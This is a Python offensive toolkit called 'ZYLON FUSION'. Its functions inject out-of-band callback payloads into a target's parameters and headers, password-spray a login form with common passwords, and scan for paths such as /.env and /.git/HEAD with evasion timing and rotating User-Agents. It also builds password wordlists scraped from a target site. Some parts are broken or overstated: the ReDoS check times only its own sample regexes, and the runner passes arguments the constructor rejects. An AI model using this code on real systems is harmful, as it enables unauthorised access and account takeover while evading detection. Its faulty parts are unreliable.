#!/usr/bin/env python3
"""
ZYLON FUSION - OAST + ReDoS + Credential + Stealth + Metadata + Wordlist Engine
Fused from: Interactsh + RegExploit + Redoctor + CredMaster + Kerbrute + FireProx
            + ExRecon + WebSpy + BlackTrack + MAT2 + Cewler + BOPSCRK + n0kovo
Capabilities:
  - OAST callback testing (Interactsh-style blind detection)
  - ReDoS vulnerability detection (RegExploit-style)
  - Credential testing / password spraying
  - Stealth scanning with timing/evasion controls
  - Metadata analysis & stripping
  - Custom wordlist generation from target website
  - Targeted password list generation (BOPSCRK-style)
  - Subdomain brute force wordlists (n0kovo-style)
Termux Compatible | No Root Required | Python 3.13+
"""

import requests
import re
import time
import os
import random
import hashlib
import string
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin

# ============================================================================
# OAST / INTERACTSH CONFIGURATION
# ============================================================================

OAST_CALLBACK_DOMAINS = [
    "oastify.com", "burpcollaborator.net", "interactsh.com",
    "interact.sh", "oast.live", "requestbin.net",
]

# ============================================================================
# REDOS VULNERABLE PATTERNS (from RegExploit)
# ============================================================================

REDOS_PATTERNS = [
    {"pattern": r"(a+)+$", "name": "Nested quantifier", "severity": "high",
     "description": "Nested + quantifiers cause catastrophic backtracking"},
    {"pattern": r"(a*)*b", "name": "Star nested star", "severity": "high",
     "description": "Nested * quantifiers cause backtracking"},
    {"pattern": r"(a|a)*b", "name": "Overlapping alternatives", "severity": "high",
     "description": "Overlapping alternatives in group with quantifier"},
    {"pattern": r"([a-z]+)*$", "name": "Character class nested", "severity": "medium"},
    {"pattern": r"(a+)+$", "name": "Repeated group repetition", "severity": "high"},
    {"pattern": r".*\.(.*)*\.(.*)*\.(.*)*", "name": "Multiple wildcards", "severity": "medium"},
    {"pattern": r"(x+x+)+y", "name": "Sequential repetition", "severity": "high"},
]

REDOS_TEST_INPUTS = [
    "a" * 30,  # Long string of 'a's
    "a" * 50,
    "a" * 30 + "!",  # Non-matching character at end
    "x" * 30 + "!",
]

# ============================================================================
# COMMON PASSWORDS FOR SPRAYING
# ============================================================================

SPRAY_PASSWORDS = [
    "Password1", "Password123", "Welcome1", "Welcome123",
    "Changeme1", "Changeme123", "Summer2024", "Winter2024",
    "Spring2024", "Fall2024", "Company1", "Company123",
    "P@ssw0rd", "P@ssword1", "Passw0rd", "Passw0rd1",
    "Qwerty123", "Admin123", "Test1234", "Secret123",
]

# ============================================================================
# STEALTH TIMING PROFILES
# ============================================================================

STEALTH_PROFILES = {
    "normal": {"delay_min": 0, "delay_max": 0.5},
    "cautious": {"delay_min": 0.5, "delay_max": 2},
    "sneaky": {"delay_min": 2, "delay_max": 6},
    "paranoid": {"delay_min": 5, "delay_max": 15},
}

STEALTH_USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
]

# ============================================================================
# METADATA SENSITIVE FIELDS
# ============================================================================

METADATA_FIELDS = [
    "GPS", "GPSLatitude", "GPSLongitude", "Author", "Creator",
    "Producer", "LastModified", "CreateDate", "ModifyDate",
    "Software", "Camera", "Make", "Model",
]


class UtilityEngine:
    """Multi-purpose utility engine - OAST + ReDoS + Cred + Stealth + Meta + Wordlist"""

    def __init__(self, target_url=None, domain=None, timeout=10, threads=10,
                 proxy=None, callback_domain=None):
        self.target_url = target_url
        self.domain = domain
        self.timeout = timeout
        self.threads = threads
        self.callback_domain = callback_domain or "oastify.com"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

    # ========================================================================
    # OAST / BLIND DETECTION
    # ========================================================================

    def test_oast_callback(self, parameter=None):
        """Test for blind vulnerabilities via OAST callback"""
        results = {
            "target": self.target_url,
            "callback_domain": self.callback_domain,
            "payloads_injected": [],
        }

        rand_id = ''.join(random.choices(string.ascii_lowercase, k=8))
        subdomain = f"{rand_id}.{self.callback_domain}"

        # Generate OAST payloads
        oast_payloads = [
            f"http://{subdomain}",
            f"//{subdomain}",
            f"http://{subdomain}/test",
            f"${{http://{subdomain}}}",
            f"http://{subdomain}",
        ]

        # Inject via parameter
        if parameter and self.target_url:
            for payload in oast_payloads[:3]:
                sep = "&" if "?" in self.target_url else "?"
                url = f"{self.target_url}{sep}{parameter}={payload}"
                try:
                    self.session.get(url, timeout=self.timeout)
                    results["payloads_injected"].append({
                        "type": "parameter",
                        "parameter": parameter,
                        "payload": payload,
                        "status": "injected",
                    })
                except Exception:
                    pass

        # Inject via headers
        headers_to_test = ['X-Forwarded-For', 'Referer', 'Origin', 'X-Custom']
        for header in headers_to_test:
            h = {'User-Agent': 'Mozilla/5.0'}
            h[header] = f"http://{subdomain}"
            try:
                self.session.get(self.target_url, headers=h, timeout=self.timeout)
                results["payloads_injected"].append({
                    "type": "header",
                    "header": header,
                    "payload": f"http://{subdomain}",
                    "status": "injected",
                })
            except Exception:
                pass

        results["note"] = f"Check callback server for hits on {subdomain}"
        return results

    # ========================================================================
    # REDOS DETECTION
    # ========================================================================

    def detect_redos(self):
        """Detect ReDoS vulnerable regex patterns"""
        results = {
            "vulnerable_patterns": [],
            "total_tested": len(REDOS_PATTERNS),
        }

        for pattern_info in REDOS_PATTERNS:
            try:
                regex = re.compile(pattern_info["pattern"])
                is_vulnerable = False
                max_time = 0

                for test_input in REDOS_TEST_INPUTS:
                    start = time.time()
                    try:
                        regex.match(test_input)
                    except Exception:
                        pass
                    elapsed = time.time() - start
                    max_time = max(max_time, elapsed)

                    if elapsed > 1.0:  # More than 1 second = vulnerable
                        is_vulnerable = True

                if is_vulnerable or max_time > 0.1:
                    results["vulnerable_patterns"].append({
                        "pattern": pattern_info["pattern"],
                        "name": pattern_info["name"],
                        "severity": pattern_info["severity"],
                        "description": pattern_info.get("description", ""),
                        "max_eval_time": round(max_time, 3),
                    })
            except re.error:
                continue

        return results

    # ========================================================================
    # CREDENTIAL TESTING / PASSWORD SPRAYING
    # ========================================================================

    def password_spray(self, usernames, login_url=None, username_field="username",
                       password_field="password", success_pattern=None):
        """Test credentials against login endpoint"""
        results = {
            "total_attempts": 0,
            "successful_logins": [],
            "failed_attempts": 0,
        }

        url = login_url or self.target_url
        if not url:
            return {"error": "No login URL specified"}

        for username in usernames:
            for password in SPRAY_PASSWORDS:
                results["total_attempts"] += 1
                try:
                    data = {username_field: username, password_field: password}
                    resp = self.session.post(url, data=data, timeout=self.timeout,
                                            allow_redirects=False)
                    if resp:
                        # Check for successful login
                        if resp.status_code in [301, 302]:
                            location = resp.headers.get('Location', '')
                            if 'error' not in location.lower() and 'login' not in location.lower():
                                results["successful_logins"].append({
                                    "username": username,
                                    "password": password,
                                })
                                break
                        elif success_pattern and re.search(success_pattern, resp.text):
                            results["successful_logins"].append({
                                "username": username,
                                "password": password,
                            })
                            break
                except Exception:
                    pass
                time.sleep(0.5)  # Rate limiting

        results["failed_attempts"] = results["total_attempts"] - len(results["successful_logins"])
        return results

    # ========================================================================
    # STEALTH SCANNING
    # ========================================================================

    def stealth_scan(self, paths=None, profile="cautious"):
        """Scan with stealth timing and evasion"""
        results = {
            "target": self.target_url,
            "profile": profile,
            "paths_found": [],
        }

        timing = STEALTH_PROFILES.get(profile, STEALTH_PROFILES["cautious"])
        scan_paths = paths or ["/admin", "/login", "/api", "/.env",
                              "/robots.txt", "/sitemap.xml", "/.git/HEAD"]

        for path in scan_paths:
            delay = random.uniform(timing["delay_min"], timing["delay_max"])
            time.sleep(delay)

            # Randomize User-Agent
            h = {'User-Agent': random.choice(STEALTH_USER_AGENTS)}

            try:
                url = urljoin(self.target_url + '/', path.lstrip('/'))
                resp = self.session.get(url, headers=h, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    results["paths_found"].append({
                        "path": path,
                        "status_code": resp.status_code,
                        "size": len(resp.text),
                    })
            except Exception:
                continue

        return results

    # ========================================================================
    # METADATA ANALYSIS
    # ========================================================================

    def analyze_metadata(self, file_path=None):
        """Analyze file metadata for sensitive information"""
        results = {
            "file": file_path,
            "metadata_found": {},
            "sensitive_fields": [],
            "gps_coordinates": None,
        }

        if not file_path or not os.path.exists(file_path):
            return {"error": "File not found"}

        try:
            # Read file and check for metadata patterns
            with open(file_path, 'rb') as f:
                content = f.read()

            text = content.decode('utf-8', errors='ignore')

            # Check for common metadata patterns
            patterns = {
                "author": r'Author[:\s]+([^\n\r]+)',
                "creator": r'Creator[:\s]+([^\n\r]+)',
                "producer": r'Producer[:\s]+([^\n\r]+)',
                "created": r'CreateDate[:\s]+([^\n\r]+)',
                "modified": r'ModifyDate[:\s]+([^\n\r]+)',
                "gps_lat": r'GPSLatitude[:\s]+([^\n\r]+)',
                "gps_lon": r'GPSLongitude[:\s]+([^\n\r]+)',
                "software": r'Software[:\s]+([^\n\r]+)',
                "camera": r'(?:Make|Model)[:\s]+([^\n\r]+)',
            }

            for field, pattern in patterns.items():
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    results["metadata_found"][field] = match.group(1)
                    if field in ["author", "creator", "gps_lat", "gps_lon"]:
                        results["sensitive_fields"].append(field)

            if "gps_lat" in results["metadata_found"] and "gps_lon" in results["metadata_found"]:
                results["gps_coordinates"] = {
                    "latitude": results["metadata_found"]["gps_lat"],
                    "longitude": results["metadata_found"]["gps_lon"],
                }

        except Exception as e:
            results["error"] = str(e)

        return results

    # ========================================================================
    # WORDLIST GENERATION
    # ========================================================================

    def generate_wordlist(self, output_path=None, depth=2):
        """Generate custom wordlist from target website"""
        results = {
            "target": self.target_url,
            "words_collected": 0,
            "wordlist": [],
        }

        if not self.target_url:
            return {"error": "No target URL specified"}

        try:
            resp = self.session.get(self.target_url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                # Extract words from page content
                text = re.sub(r'<[^>]+>', ' ', resp.text)  # Strip HTML
                words = re.findall(r'[a-zA-Z]{3,20}', text)
                unique_words = list(set(w.lower() for w in words if len(w) >= 3))

                # Generate mutations (BOPSCRK-style)
                mutations = set()
                for word in unique_words[:50]:
                    mutations.add(word)
                    mutations.add(word.capitalize())
                    mutations.add(word.upper())
                    mutations.add(word + "1")
                    mutations.add(word + "123")
                    mutations.add(word + "!")
                    mutations.add(word + "@123")
                    mutations.add(word.capitalize() + "!")
                    mutations.add(word.capitalize() + "123")
                    mutations.add(word + "2024")
                    mutations.add(word + "2025")

                results["wordlist"] = sorted(mutations)
                results["words_collected"] = len(results["wordlist"])

                # Save to file if path provided
                if output_path:
                    with open(output_path, 'w') as f:
                        f.write('\n'.join(results["wordlist"]))

        except Exception as e:
            results["error"] = str(e)

        return results


# ============================================================================
# CONVENIENCE RUNNER FUNCTIONS
# ============================================================================

def run_utility_scan(target, scan_type="oast", **kwargs):
    """Run utility scan"""
    engine = UtilityEngine(target_url=target, **kwargs)

    scan_methods = {
        "oast": engine.test_oast_callback,
        "redos": engine.detect_redos,
        "spray": engine.password_spray,
        "stealth": engine.stealth_scan,
        "metadata": engine.analyze_metadata,
        "wordlist": engine.generate_wordlist,
    }

    if scan_type in scan_methods:
        if scan_type == "oast":
            return engine.test_oast_callback(parameter=kwargs.get("parameter", "url"))
        elif scan_type == "spray":
            return engine.password_spray(kwargs.get("usernames", ["admin"]))
        elif scan_type == "metadata":
            return engine.analyze_metadata(kwargs.get("file_path"))
        else:
            return scan_methods[scan_type]()
    return {"error": f"Unknown scan type: {scan_type}"}
